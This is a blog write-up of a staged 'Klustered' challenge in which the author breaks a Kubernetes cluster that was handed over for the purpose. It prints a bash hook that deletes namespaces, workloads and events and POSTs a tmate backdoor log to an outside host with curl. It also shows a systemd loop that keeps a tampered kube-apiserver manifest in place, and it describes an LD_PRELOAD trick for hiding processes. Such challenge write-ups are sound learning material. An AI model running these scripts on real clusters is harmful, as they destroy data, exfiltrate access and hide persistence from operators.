---
title: "kubernetes malware writeup for klustered"
date: "2021-05-03"
author: "kris nóva"
keywords: ["Klustered", "Linux", "Kernel", "YouTube"]
summary: "Klustered episode with Kris Nóva"
---
---

yes. hi. hello. me again.

recently i had someone on twitter say the following phrase to me:

 > You’ll be given SSH access and a kubeconfig to a Kubernetes cluster on Monday. You can break it however you want, as long as the OS can still boot and Teleport continues to function. 

{{< youtube id="ysfUgYs4YYY" >}}

### links

 - [thomas strömberg](http://stromberg.org/t/)
 - [rawkode](https://rawkode.com/)
 - [kris-nova/hack](https://github.com/kris-nova/hack)
 - [youtube](https://www.youtube.com/watch?v=ysfUgYs4YYY)

---

so naturally - let's hack it 🏴🏴‍☠️


let's see what we found

### gaining access

we were given a kube config file and SSH access to the cluster - but we only needed the kube config.

### privilege escalation

we found that we were able to privilege escalate from a container to the nodes in the cluster

which means we had access to the following host namespaces

 - IPC
 - Mount
 - Net
 - Pid

### cluster itself

we discovered the cluster had a deployment running called `klustered` and we found the source of the deployment [here](https://github.com/rawkode/klustered/tree/main/000-workload) in [@rawkode](https://github.com/rawkode)'s github.

we saved all the cluster raw yaml [here](https://nivenly.com/assets/docs/klustered.yaml)

---

# the malware

we installed a multi tiered malware attack with a few fun components and left a great breadcrump trail for our detectives.

starting from the top of the stack down we had the following components setup in the cluster

### kubernetes default namespace

the default namespace was `pwned` and was running the following [source](https://github.com/kris-nova/hack/blob/main/kubernetes-images/infect-api-server/run.sh)

```bash
[nova@emily]: ~/hack/kubernetes-images/infect-api-server>$ k get po
NAME                                    READY   STATUS              RESTARTS   AGE
0-----------------------------------o   0/1     CrashLoopBackOff   0          1337m
1---------------n0va----------------o   0/1     CrashLoopBackOff   0          1337m
2-----------------------------------o   0/1     CrashLoopBackOff   0          1337m
3----kris-n0va-is-a-professional----o   0/1     CrashLoopBackOff   0          1337m
4----grown-up-business-computer-----o   0/1     CrashLoopBackOff   0          1337m
5----person-who-does-very-serious---o   0/1     CrashLoopBackOff   0          1337m
6----computer-boops-for-her-career--o   0/1     CrashLoopBackOff   0          1337m
7------------n-joy-the--------------o   0/1     CrashLoopBackOff   0          1337m
8----------klustered-fuck-----------o   0/1     CrashLoopBackOff   0          1337m
9-----------------------------------o   0/1     CrashLoopBackOff   0          1337m

```

### kubernetes n0va namespace

this was running a series of bitcoin mining applications that effectively were just for theatre and part of the "malware"

```bash
[nova@emily]: ~/hack/kubernetes-images/infect-api-server>$ k get po -n n0va
NAME     READY   STATUS              RESTARTS   AGE
n0va-0   0/1     Running   0          1337m
n0va-1   0/1     Running   0          69m
n0va-2   0/1     Running   0          69m
n0va-3   0/1     Running   0          69m
n0va-4   0/1     Running   0          69m
n0va-5   0/1     Running   0          69m
n0va-6   0/1     Running   0          69m
n0va-7   0/1     Running   0          69m
n0va-8   0/1     Running   0          69m
n0va-9   0/1     Running   0          69m
```

#### kubernetes kube-system namespace

here is where our "controller" lived.

the attack vector here is that we mounted the kube config from the host directly into a sidecar container that had `kubectl` inside.

then we just had fun with some bash!

```bash 
function hook() {
    # ----------------------------------------------------------
    # Here is where we can repeat any bash command with a working
    # Kubernetes kubeconfig
    #
    # Keep it secret. Keep it safe.
    #
    # ----

    kubectl delete events --all
    kubectl delete events --all -n kube-system

    # keep our boops but delete their boops
    for ns in $(kubectl get ns -o jsonpath="{.items[*].metadata.name}"); do
      if [ "$ns" = "kube-system" ] || [ "$ns" = "n0va" ] || [ "$ns" = "kube-public" ] || [ "$ns" = "default" ] || [ "$ns" = "kube-node-lease" ] || [ "$ns" = "cilium" ]  || [ "$ns" = "metallb-system" ]  || [ "$ns" = "rook-ceph" ]; then
        continue
      fi
      # Delete all namespaces other than those ^
      kubectl delete namespace $ns
    done

    # we know the workload had "klustered" labels so let's also fuck with those
    kubectl delete po -l app=klustered --all-namespaces
    kubectl delete deploy,ds,svc,sts,cm --all

    # let's have fun in the default namespace
    kubectl run "0-----------------------------------o" --image busybox
    kubectl run "1---------------n0va----------------o" --image busybox
    kubectl run "2-----------------------------------o" --image busybox
    kubectl run "3----kris-n0va-is-a-professional----o" --image busybox
    kubectl run "4----grown-up-business-computer-----o" --image busybox
    kubectl run "5----person-who-does-very-serious---o" --image busybox
    kubectl run "6----computer-boops-for-her-career--o" --image busybox
    kubectl run "7------------n-joy-the--------------o" --image busybox
    kubectl run "8----------klustered-fuck-----------o" --image busybox
    kubectl run "9-----------------------------------o" --image busybox


    # Here is our bitcoin "miner"
    kubectl create namespace n0va
    kubectl run n0va-0 --image krisnova/n0va -n n0va
    kubectl run n0va-1 --image krisnova/n0va -n n0va
    kubectl run n0va-2 --image krisnova/n0va -n n0va
    kubectl run n0va-3 --image krisnova/n0va -n n0va
    kubectl run n0va-4 --image krisnova/n0va -n n0va
    kubectl run n0va-5 --image krisnova/n0va -n n0va
    kubectl run n0va-6 --image krisnova/n0va -n n0va
    kubectl run n0va-7 --image krisnova/n0va -n n0va
    kubectl run n0va-8 --image krisnova/n0va -n n0va
    kubectl run n0va-9 --image krisnova/n0va -n n0va
    # ----
    #
    # ---------------------------------------------------------
    # Ensure the backdoor is always sending to data
    #
    #
    data=$(cat tmate.log)
    curl -X POST -m 1 http://nivenly.com:1337/ --data "$data"
    sleep 3 # sleep
}
```

the [source](https://github.com/kris-nova/hack/blob/main/kubernetes-images/infect-api-server/run.sh) of the infection will run along side the kubernetes API server

```yaml 
spec:
  containers:
    - name: nova
      image: krisnova/infect-api-server
      imagePullPolicy: Always
```

### kubernetes static manifests

the beauty of this attack is that in order to "fix" the sidecar injection you would have to escalate to the host (or access via SSH or similar) and manually edit `/etc/kubernetes/manifests/kube-apiserver.yaml`

editing the pod via `kubectl edit` will be ineffective.

### systemd n0va

furthermore, we added extra resiliency to our mutated manifest by watching it with a small systemd service.

```bash
function hook() {
    # ----------------------------------------------------------
    # Here is where we can repeat any bash command we want to
    # ensure on the system.
    #
    # Keep it secret. Keep it safe.
    # ----
    manifest="/etc/kubernetes/manifests/kube-apiserver.yaml"
    override="/tmp/.n0va"
    if grep "n0va" ${manifest}; then
      return
    else
      cp ${override} ${manifest}
    fi
    # ----
    #
    # ---------------------------------------------------------
    sleep 1 # sleep
}

while true; do
  hook
done

```

### ld preload

the last bit of fun we had was hiding the process from common linux tools like `ps` and `top`

we "hid" the systemd service from *everywhere except the systemd unit location and of course the block device itself

the `obscure` code can be found [here](https://github.com/kris-nova/hack/blob/main/kernel-tools/obscure-ld-preload/obscure.c)

so now `ps` was unable to find the process that was "fixing" the mutated file.

---

# showtime 

links for the show

 - [discord](https://discord.com/invite/ErVgHCN)
 - [youtube](https://www.youtube.com/watch?v=ysfUgYs4YYY)

---

# debugging

we encourage everyone to watch the show above, albeit the main takeway can be found here

[sleuthkit.org/fls](http://www.sleuthkit.org/sleuthkit/man/fls.html)

```bash
fls - List file and directory names in a disk image.
```

---

# thanks to `rawkode` and `tstromburg`

big shoutout to [thomas strömberg](http://stromberg.org/t/) for his work

thanks to [rawkode](https://rawkode.com/) for setting up the fun.